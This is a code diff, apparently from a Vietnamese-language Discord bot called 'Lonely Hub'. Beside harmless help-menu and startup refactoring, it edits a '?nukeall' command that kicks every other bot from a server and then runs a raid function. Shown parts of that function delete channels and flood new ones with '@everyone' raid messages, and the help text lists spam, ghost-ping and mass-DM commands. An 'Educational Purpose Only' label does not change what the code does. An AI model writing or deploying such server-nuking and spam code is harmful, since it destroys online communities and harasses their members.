-            name="⚡ LỆNH ADMIN (Chỉ cho user được phép)",
-            value=admin_commands,
-            inline=False
-        )
-    else:
-        embed.add_field(
-            name="🔒 LỆNH ADMIN",
-            value="*Bạn không có quyền sử dụng các lệnh admin*",
-            inline=False
-        )
-    
-    # Auto response
-    embed.add_field(
-        name="🤖 TỰ ĐỘNG PHẢN HỒI",
-        value=(
-            "Bot sẽ tự động phản hồi khi nhận diện các từ khóa:\n"
-            "• `client`, `executor`, `executors` - Hiển thị danh sách client\n"
-            "• `luật` - Hướng dẫn xem luật\n"
-            "• `máy ảo`, `cách nhận máy ảo` - Hướng dẫn nhận máy ảo"
-        ),
-        inline=False
-    )
-    
-    # Notes
-    embed.add_field(
-        name="📝 GHI CHÚ",
-        value=(
-            "• Các lệnh admin chỉ dành cho user được cấp quyền\n"
-            "• Tất cả lệnh đều được kiểm soát, ghi log và thông báo qua DM Owner\n"
-            "• Thời gian hiển thị là UTC+7 (Việt Nam)"
-        ),
-        inline=False
-    )
-    
-    # Set author, thumbnail, footer
-    embed.set_author(name="Lonely Hub Help System", icon_url=ICON_URL)
-    embed.set_thumbnail(url=ICON_URL)
-    embed.set_footer(
-        text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')} | Yêu cầu bởi {user}",
-        icon_url=FOOTER_ICON_URL
-    )
-    embed.set_image(url=BANNER_URL)
-    
-    # ⚡ Phản hồi trước
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.author_id:
+            await interaction.response.send_message("❌ Bạn không được phép thao tác.", ephemeral=True)
+            return False
+        return True
 
-    # 📌 Sau khi trả lời thì log + DM
-    log_command(user, "/help", guild_name, "Slash Command")
-    await send_dm_notification(user, "/help", guild_name, "Slash Command")
-    
+    @discord.ui.button(label="⏮️ Prev", style=discord.ButtonStyle.secondary)
+    async def prev_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.current = (self.current - 1) % len(self.pages)
+        await interaction.response.edit_message(embed=self.pages[self.current], view=self)
+
+    @discord.ui.button(label="⏭️ Next", style=discord.ButtonStyle.secondary)
+    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.current = (self.current + 1) % len(self.pages)
+        await interaction.response.edit_message(embed=self.pages[self.current], view=self)
+
+    @discord.ui.button(label="🔒 Close", style=discord.ButtonStyle.red)
+    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.message.delete()
+        self.stop()
+            
 # Slash Command - Ping
 @bot.tree.command(name="ping", description="Kiểm tra độ trễ của bot")
 async def ping(interaction: discord.Interaction):
@@ -3248,6 +5290,40 @@ class SpamButton(discord.ui.View):
                 ephemeral=True
             )
 
+@bot.tree.command(name="time", description="Xem thời gian hiện tại (UTC+7 - Việt Nam)")
+async def time_command(interaction: discord.Interaction):
+    current_time = get_utc7_time()
+
+    embed = discord.Embed(
+        title="🕐 Thời gian hiện tại",
+        description=f"**UTC+7 (Việt Nam)**\n```{current_time.strftime('%H:%M:%S %d/%m/%Y')}```",
+        color=discord.Color.gold(),
+        timestamp=current_time
+    )
+
+    embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
+    embed.set_footer(
+        text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}",
+        icon_url=FOOTER_ICON_URL
+    )
+    embed.set_thumbnail(url=ICON_URL)
+
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+# --- Slash command ---
+@bot.tree.command(name="help", description="Hiển thị tất cả lệnh có sẵn trong bot")
+async def slash_help(interaction: discord.Interaction):
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    is_admin = is_user_allowed(interaction.user.id)  # kiểm tra có phải admin/whitelist không
+
+    pages = build_help_pages(interaction.user.id, user, is_admin)
+    view = HelpView(pages, interaction.user.id)
+
+    await interaction.response.send_message(embed=pages[0], view=view, ephemeral=True)
+    # 📌 Sau khi trả lời thì log + DM
+    log_command(user, "/help", guild_name, "Slash Command")
+    await send_dm_notification(user, "/help", guild_name, "Slash Command")
+
 @bot.tree.command(name="spamv2", description="Spam tin nhắn ở kênh (hoặc DMs,ko cần invite)")
 @app_commands.describe(
     message="Nội dung tin nhắn cần gửi",
@@ -3484,72 +5560,78 @@ async def invite(interaction: discord.Interaction):
                                                                     
 # ==================== CÁC LỆNH MỚI TÍCH HỢP ====================
 
-# Lệnh ?nukeall - Nuke server (tích hợp từ nuke.py)
 @bot.command()
 async def nukeall(ctx):
-    """Raid server"""
-    # Kiểm tra xem user có bị cấm không
+    """Raid server với kick bot trước"""
     if is_user_banned(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Bị cấm",
-            description="Bạn đã bị cấm sử dụng bot này!",
-            color=discord.Color.red()
-        )
+        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
         await ctx.send(embed=embed)
         return
     
-    # Kiểm tra quyền
     if not is_user_allowed(ctx.author.id):
-        embed = discord.Embed(
-            title="❌ Lỗi",
-            description="Bạn không có quyền sử dụng lệnh này!",
-            color=discord.Color.red()
-        )
+        embed = discord.Embed(title="❌ Lỗi", description="Bạn không có quyền sử dụng lệnh này!", color=discord.Color.red())
         await ctx.send(embed=embed)
         return
     
-    # Kiểm tra nếu đang ở guild bị cấm
     if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
-        embed = discord.Embed(
-            title="❌ Lỗi",
-            description="Lệnh này không được phép sử dụng trong server này!",
-            color=discord.Color.red()
-        )
+        embed = discord.Embed(title="❌ Lỗi", description="Lệnh này không được phép sử dụng trong server này!", color=discord.Color.red())
         await ctx.send(embed=embed)
         return
     
-    # LOG TRƯỚC KHI XỬ LÝ
+    # LOG
     user = f"{ctx.author.name}#{ctx.author.discriminator}"
     guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_message = log_command(user, "?nukeall", guild_name, "Text Command")
-    
-    # Gửi DM thông báo với Embed
+    log_command(user, "?nukeall", guild_name, "Text Command")
     await send_dm_notification(user, "?nukeall", guild_name, "Text Command")
     
     try:
         if not ctx.guild.me.guild_permissions.administrator:
-            await ctx.send("Bot Has Missing Administrator Role")
-            log("Bot Has Missing Administrator Role")
+            await ctx.send("❌ Bot cần quyền Administrator!")
             return
         
         try:
             await ctx.message.delete()
-            log("Deleted Command Succesfully!")
         except:
-            log("Can't Delete Command")
+            pass
         
-        log("Starting Raid Server...")
-        status_msg = await ctx.send("Starting raid...")
-        await asyncio.sleep(1)
+        # BƯỚC 1: KICK TẤT CẢ BOT
+        kick_embed = discord.Embed(
+            title="🔄 Đang xử lý...",
+            description="**Đang kick tất cả bot...**\n\n*Disclaimer: Đây chỉ là mục đích học tập Python*",
+            color=discord.Color.orange()
+        )
+        kick_embed.set_footer(text="Lonely Hub - Educational Purpose Only")
+        status_msg = await ctx.send(embed=kick_embed)
+        
+        kicked_bots = 0
+        if ctx.guild.me.guild_permissions.kick_members:
+            for member in ctx.guild.members:
+                if member.bot and member != ctx.guild.me:  # Không kick chính mình
+                    try:
+                        await member.kick(reason="NukeAll Command - Educational Purpose")
+                        kicked_bots += 1
+                        await asyncio.sleep(0.5)
+                    except:
+                        continue
+        
+        # BƯỚC 2: TIẾP TỤC NUKE NHƯ CŨ
+        await status_msg.edit(embed=discord.Embed(
+            title="💥 Bắt đầu Nuke...",
+            description=f"Đã kick {kicked_bots} bot\n**Bắt đầu nuke server...**",
+            color=discord.Color.red()
+        ))
+        
+        await asyncio.sleep(2)
         await status_msg.delete()
         
+        # GỌI HÀM NUKE CŨ
         await raid_server(ctx.guild)
         
     except Exception as e:
         log(f"Error In Nuke Command: {e}")
 
 async def raid_server(guild):
-    """Function To Raid"""
+    """Function To Raid (giữ nguyên nội dung chat như cũ)"""
     try:
         log(f"Starting Raid: {guild.name}")
         
@@ -3570,6 +5652,7 @@ async def raid_server(guild):
         log(f"Deleted {channel_count} Channel Succesfuly")
         
         log("Creating Channel and send messages...")
+        # GIỮ NGUYÊN NỘI DUNG CHAT NHƯ CŨ
         message_content = """@everyone
 # Your Server Got Raided By Lonely Hub
 # Join Server And Dms Owner To Invite Bot
@@ -3609,7 +5692,7 @@ async def raid_server(guild):
         
     except Exception as e:
         log(f"Raid Error:: {e}")
-
+        
 # Lệnh ?raidall - Spam tất cả kênh với tin nhắn
 @bot.command()
 async def raidall(ctx):
@@ -4062,92 +6145,13 @@ async def on_message(message):
             embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
             embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
             
-            await message.reply(embed=embed, mention_author=False)
-        
+            await message.reply(embed=embed, mention_author=False)    
+            
         elif command == "help":
-            current_time = get_utc7_time()
-            
-            embed = discord.Embed(
-                title="🤖 Lonely Hub - Hệ Thống Lệnh",
-                description="Xin chào! Đây là danh sách đầy đủ các lệnh có trong bot.\n\n**📊 Thông tin bot:**\n• Prefix: `!`, `?`, `.`, `/`\n• Múi giờ: `UTC+7`\n• Phiên bản: `1.0.0`",
-                color=0x00ffaa,
-                timestamp=current_time
-            )
-            
-            # Thêm các lệnh thông thường
-            embed.add_field(
-                name="🔧 LỆNH CƠ BẢN",
-                value=(
-                    "• `/ping` - Kiểm tra độ trễ của bot\n"
-                    "• `/info` - Xem thông tin về bot\n"
-                    "• `/whitelist` - Xem danh sách user được phép\n"
-                    "• `/help` - Hiển thị trợ giúp này\n"
-                    "• `/say` - Làm bot nói gì đó\n"
-                    "• `/sayv2` - Làm bot nói gì đó (No Need Invite)\n"
-                    "• `/ghostping <user_id> [delay] [quantity]` - Ghost ping người dùng\n"
-                    "• `/ghostpingv2 <user_id> [delay] [quantity]` - Ghost ping người dùng (No Need Invite)\n"
-                    "• `/dms <user_id> <message>` - Gửi tin nhắn DM đến người dùng\n"
-                    "• `/spam <message> <quantity> [user_id]` - Spam tin nhắn\n"
-                    "• `/spamv2 <message> <quantity> [user_id]` - Spam tin nhắn (No Need Invite)\n"            
-                    "• `/invite` - Invite Bot To The Server"
-                ),
-                inline=False
-            )
-            
-            # Thêm các lệnh đặc biệt (chỉ cho admin)
-            if is_user_allowed(message.author.id):
-                embed.add_field(
-                    name="⚡ LỆNH ADMIN (Chỉ cho user được phép)",
-                    value=(
-                        "• `/premium_command` - Xem các lệnh premium (admin only)\n"
-                        "• `/bancmd <user_id> <reason>` - Cấm user dùng lệnh\n"
-                        "• `/unbancmd <user_id> <reason>` - Gỡ cấm user dùng lệnh\n"
-                        "• `/bancmdlist` - Xem các users bị cấm dùng lệnh\n"
-                        "• `/addwhitelist <user_id> <name>` - Add Whitelist Cho Users\n"
-                        "• `/removewhitelist <user_id> <name>` - Xoá whitelist của users"
-                    ),
-                    inline=False
-                )
-            else:
-                embed.add_field(
-                    name="🔒 LỆNH ADMIN",
-                    value="*Bạn không có quyền sử dụng các lệnh admin*",
-                    inline=False
-                )
-            
-            # Thêm thông tin về auto response
-            embed.add_field(
-                name="🤖 TỰ ĐỘNG PHẢN HỒI",
-                value=(
-                    "Bot sẽ tự động phản hồi khi nhận diện các từ khóa:\n"
-                    "• `client`, `executor`, `executors` - Hiển thị danh sách client\n"
-                    "• `luật` - Hướng dẫn xem luật\n"
-                    "• `máy ảo`, `cách nhận máy ảo` - Hướng dẫn nhận máy ảo"
-                ),
-                inline=False
-            )
-            
-            # Thêm thông tin footer
-            embed.add_field(
-                name="📝 GHI CHÚ",
-                value=(
-                    "• Các lệnh admin chỉ dành cho user được cấp quyền\n"
-                    "• Tất cả lệnh đều được kiểm soát, ghi log và thông báo qua DM Owner\n"
-                    "• Thời gian hiển thị là UTC+7 (Việt Nam)"
-                ),
-                inline=False
-            )
-            
-            # Set author, thumbnail, footer
-            embed.set_author(name="Lonely Hub Help System", icon_url=ICON_URL)
-            embed.set_thumbnail(url=ICON_URL)
-            embed.set_footer(
-                text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')} | Yêu cầu bởi {user}",
-                icon_url=FOOTER_ICON_URL
-            )
-            
-            await message.reply(embed=embed, mention_author=False)
-        
+            pages = build_help_pages(message.author.id, f"{message.author}")
+            view = HelpView(pages, message.author.id)
+            await message.reply(embed=pages[0], view=view, mention_author=False)
+
         elif command == "info":
             current_time = get_utc7_time()
             
@@ -4186,7 +6190,7 @@ async def on_message(message):
             
             await message.reply(embed=embed, mention_author=False)
         
-        elif command == "users":
+        elif command == "whitelist":
             current_time = get_utc7_time()
             
             embed = discord.Embed(
@@ -5023,17 +7027,21 @@ async def on_message(message):
     # Tiếp tục xử lý các lệnh khác
     await bot.process_commands(message)
 
+
 # Chạy bot (THÊM TOKEN CỦA BẠN VÀO ĐÂY)
 if __name__ == "__main__":
-    # Lấy token từ biến môi trường
-    token = os.getenv("DISCORD_BOT_TOKEN")  # nếu không có, sẽ yêu cầu input
+    
+    token = BotToken
 
-    if not token:
-        token = input(Fore.CYAN + "[Info]" + Fore.WHITE + " Vui lòng nhập token bot Discord: " + Style.RESET_ALL).strip()
-
-    try:
-        print(Fore.CYAN + "[Info]" + Fore.WHITE + " Đang khởi động bot..." + Style.RESET_ALL)
-        bot.run(token)
-    except Exception as e:
-        print(Fore.RED + f"[Error] Lỗi khi khởi động bot: {e}" + Style.RESET_ALL)
-        print(Fore.YELLOW + "[Debug] Vui lòng kiểm tra lại token và thử lại." + Style.RESET_ALL)
+    while True:
+        if not token:
+            token = input(Fore.CYAN + "[Info] " + Fore.WHITE + "Vui lòng nhập token bot Discord: " + Style.RESET_ALL).strip()
+        
+        try:
+            print(Fore.CYAN + "[Info] " + Fore.WHITE + "Đang khởi động bot..." + Style.RESET_ALL)
+            bot.run(token)
+            break  # nếu chạy thành công thì thoát loop
+        except Exception as e:
+            print(Fore.RED + f"[Error] Lỗi khi khởi động bot: {e}" + Style.RESET_ALL)
+            print(Fore.YELLOW + "[Debug] Token không hợp lệ hoặc có lỗi. Vui lòng nhập lại." + Style.RESET_ALL)
+            token = None  # reset token để yêu cầu nhập lại
